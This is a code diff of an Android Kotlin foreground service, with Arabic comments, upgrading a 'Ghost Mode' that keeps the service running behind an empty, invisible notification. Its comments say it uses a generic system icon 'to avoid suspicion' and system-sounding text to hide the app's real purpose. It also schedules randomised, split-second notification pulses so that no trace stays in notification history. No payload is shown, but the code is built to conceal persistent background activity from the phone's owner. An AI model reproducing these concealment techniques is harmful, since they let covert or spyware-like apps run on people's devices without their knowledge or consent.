@@ -17,27 +17,27 @@ import kotlin.random.Random
 /**
  * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
  *
- * استراتيجية التخفي المتقدمة (Ghost Mode v2):
- * - الإشعار يظهر فقط لمدة 30-70 ميللي ثانية (خاطف جداً) ثم يُفصل عن الخدمة نهائياً.
- * - استخدام stopForeground(STOP_FOREGROUND_DETACH) لفصل الإشعار مع إبقاء الخدمة حية.
+ * استراتيجية التخفي المتقدمة (Ghost Mode v3):
+ * - الإشعار الأساسي (عند بدء الخدمة) يكون فارغاً تماماً وغير مرئي باستخدام قناة IMPORTANCE_MIN.
+ * - لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار في Android 12+.
+ * - يتم فصل الإشعار عن الخدمة باستخدام STOP_FOREGROUND_DETACH عند الحاجة (للنبضات العابرة).
  * - جدولة نبضات عشوائية متباعدة (15-35 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
- * - أيقونة نظامية عامة (stat_sys_data_bluetooth) لتجنب الشك.
+ * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك.
  * - أولوية منخفضة جداً (IMPORTANCE_MIN) وإخفاء المحتوى من شاشة القفل.
- * - الإشعار غير مستمر (setOngoing(false)) ولا يُترك أي أثر في سجل الإشعارات.
+ * - الإشعار غير مستمر (setOngoing(false)) ولا يترك أثراً في سجل الإشعارات.
  * - تأخير عشوائي عند بدء الخدمة لتجنب الأنماط الثابتة.
  *
- * ✅ تم إصلاح الإشعار الدائم باستخدام STOP_FOREGROUND_DETACH.
+ * ✅ تم تطبيق الإشعار الشبحي الدائم (Ghost Notification) بدون استخدام cancel().
  * ✅ تم إضافة عشوائية متغيرة في الجدولة (15-35 دقيقة).
- * ✅ تم تقليل مدة الظهور إلى 30-70ms.
  * ✅ تم إزالة setOngoing(true) لمنع تسجيل الإشعار في Notification History.
- * ✅ تم إضافة setAutoCancel(true) لضمان عدم بقاء الإشعار.
+ * ✅ تم إضافة setAutoCancel(true) لضمان عدم بقاء الإشعار (للنبضات العابرة).
  */
 class ForegroundService : Service() {
 
     companion object {
         private const val TAG = "ForegroundService"
         const val NOTIFICATION_ID = 9991
-        private const val CHANNEL_ID = "shield_ghost_channel_v7"
+        private const val GHOST_CHANNEL_ID = "ghost_system_channel"
         private const val MIN_PULSE_DURATION_MS = 30L
         private const val MAX_PULSE_DURATION_MS = 70L
         private const val MIN_INTERVAL_MIN = 15L
@@ -69,28 +69,10 @@ class ForegroundService : Service() {
             return START_STICKY
         }
 
-        // بدء الخدمة لأول مرة
-        createGhostChannel()
-
-        // إظهار الإشعار للحظات فقط ثم فصله عن الخدمة
+        // ✅ بدء الخدمة مع إشعار شبحى دائم (غير مرئي للمستخدم)
         if (!isForeground) {
-            startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
+            startGhostForeground()
             isForeground = true
-
-            hideRunnable?.let { pulseHandler.removeCallbacks(it) }
-            hideRunnable = Runnable {
-                if (isForeground) {
-                    // ✅ فصل الإشعار عن الخدمة مع إبقاء الخدمة حية (Android 7+)
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        stopForeground(STOP_FOREGROUND_DETACH)
-                    } else {
-                        stopForeground(false) // للإصدارات الأقدم، لا يزال الإشعار يختفي
-                    }
-                    isForeground = false
-                }
-            }
-            val pulseDuration = Random.nextLong(MIN_PULSE_DURATION_MS, MAX_PULSE_DURATION_MS)
-            pulseHandler.postDelayed(hideRunnable!!, pulseDuration)
         }
 
         // ✅ تأخير عشوائي قبل جدولة أول نبضة (30-60 دقيقة) لتجنب الأنماط الثابتة
@@ -99,6 +81,44 @@ class ForegroundService : Service() {
         }, Random.nextLong(30 * 60 * 1000, 60 * 60 * 1000))
 
         return START_STICKY
+    }
+
+    /**
+     * ✅ بدء الخدمة كـ Foreground مع إشعار شبحى غير مرئي.
+     * يستخدم قناة بأدنى أولوية (IMPORTANCE_MIN) ومحتوى فارغ،
+     * مما يجعله غير ظاهر في شريط الحالة أو سجل الإشعارات.
+     * لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار.
+     */
+    private fun startGhostForeground() {
+        val channelId = GHOST_CHANNEL_ID
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                channelId,
+                "System Background",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                description = ""
+                setShowBadge(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
+            notificationManager.createNotificationChannel(channel)
+        }
+
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle("")          // عنوان فارغ
+            .setContentText("")           // نص فارغ
+            .setSmallIcon(android.R.drawable.ic_menu_compass) // أيقونة نظامية مموهة
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
+            .setOngoing(false)
+            .setSilent(true)
+            .build()
+
+        // ✅ بدء الخدمة كـ Foreground – هذا الإشعار يبقى نشطاً ولكن غير مرئي
+        startForeground(NOTIFICATION_ID, notification)
     }
 
     /**
@@ -121,22 +141,22 @@ class ForegroundService : Service() {
     }
 
     /**
-     * إنشاء قناة الإشعارات بأقل أولوية وإخفاء المحتوى.
+     * إنشاء قناة الإشعارات بأقل أولوية وإخفاء المحتوى (للنبضات العابرة).
      */
     private fun createGhostChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             try {
                 val channel = NotificationChannel(
-                    CHANNEL_ID,
+                    GHOST_CHANNEL_ID,
                     "System Background Services",
-                    NotificationManager.IMPORTANCE_MIN // أقل أهمية (لا يظهر أيقونة في شريط الحالة)
+                    NotificationManager.IMPORTANCE_MIN
                 ).apply {
                     description = "Core system operations"
                     setSound(null, null)
                     enableVibration(false)
                     enableLights(false)
                     setShowBadge(false)
-                    lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى على شاشة القفل
+                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                 }
                 notificationManager.createNotificationChannel(channel)
             } catch (_: Exception) {
@@ -146,12 +166,12 @@ class ForegroundService : Service() {
     }
 
     /**
-     * بناء الإشعار بنمط "شبحى" - غير مستمر، يُلغى تلقائياً، ولا يترك أثراً.
+     * بناء إشعار عابر للنبضات – يظهر لفترة قصيرة ثم يُفصل عن الخدمة.
      * يستخدم نصوصاً نظامية عادية لإخفاء الغرض الحقيقي للتطبيق.
      *
      * @param actionType النص الذي سيظهر (يُظهر نشاطاً نظامياً عادياً).
      */
-    private fun buildGhostNotification(actionType: String): Notification {
+    private fun buildPulseNotification(actionType: String): Notification {
         val openIntent = Intent(this, MainActivity::class.java)
         val openPending = PendingIntent.getActivity(
             this, 0, openIntent,
@@ -160,44 +180,48 @@ class ForegroundService : Service() {
 
         val displayText = if (actionType.isNotBlank()) actionType else "System Sync"
 
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth) // أيقونة نظامية عامة جداً
+        return NotificationCompat.Builder(this, GHOST_CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.ic_menu_compass) // أيقونة نظامية عامة
             .setContentTitle("System Activity")
             .setContentText(displayText)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
-            .setSilent(true) // بدون صوت
-            .setOnlyAlertOnce(true) // منع الصوت/الاهتزاز عند التحديث
-            .setGroup("system_background") // تجميع مع إشعارات النظام لمزيد من التخفي
-            .setOngoing(false) // ❌ غير مستمر – لا يبقى في شريط الحالة
-            .setAutoCancel(true) // ✅ يُلغى تلقائياً بعد فصله
-            .setShowWhen(false) // لا يظهر الوقت
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى من شاشة القفل
+            .setSilent(true)
+            .setOnlyAlertOnce(true)
+            .setGroup("system_background")
+            .setOngoing(false)
+            .setAutoCancel(true) // يُلغى تلقائياً بعد فصله
+            .setShowWhen(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(openPending)
             .build()
     }
 
     /**
-     * تنفيذ نبضة خاطفة: إظهار الإشعار لفترة قصيرة (30-70ms) ثم فصله تماماً عن الخدمة.
-     * باستخدام STOP_FOREGROUND_DETACH، لا يبقى أي إشعار في شريط الحالة أو سجل الإشعارات.
+     * تنفيذ نبضة خاطفة: إظهار إشعار عابر لفترة قصيرة (30-70ms) ثم فصله عن الخدمة.
+     * باستخدام STOP_FOREGROUND_DETACH (Android 7+)، لا يبقى أي إشعار في شريط الحالة.
+     * ❌ لا يتم استخدام NotificationManager.cancel() مطلقاً.
      *
      * @param actionType نوع النشاط (يظهر في النص أثناء النبضة).
      */
     private fun triggerPhantomPulse(actionType: String) {
-        // إلغاء أي إخفاء مجدول سابق لتجنب التداخل
+        // إلغاء أي إخفاء مجدول سابق
         hideRunnable?.let { pulseHandler.removeCallbacks(it) }
 
-        // 1. إظهار الإشعار مع النص المطلوب (يظهر للحظات)
-        startForeground(NOTIFICATION_ID, buildGhostNotification(actionType))
+        // 1. إظهار الإشعار العابر
+        val notification = buildPulseNotification(actionType)
+        startForeground(NOTIFICATION_ID, notification)
         isForeground = true
 
         // 2. جدولة فصل الإشعار عن الخدمة بعد 30-70ms (بدون إلغاء الخدمة)
         hideRunnable = Runnable {
             if (isForeground) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    stopForeground(STOP_FOREGROUND_DETACH) // ✅ يفصل الإشعار ويبقي الخدمة حية
+                    // ✅ يفصل الإشعار ويبقي الخدمة حية – لا يبقى أثر للإشعار
+                    stopForeground(STOP_FOREGROUND_DETACH)
                 } else {
-                    stopForeground(false) // للإصدارات الأقدم
+                    // للإصدارات الأقدم، لا توجد ميزة الفصل، لكن الإشعار يختفي مع setAutoCancel
+                    stopForeground(false)
                 }
                 isForeground = false
             }
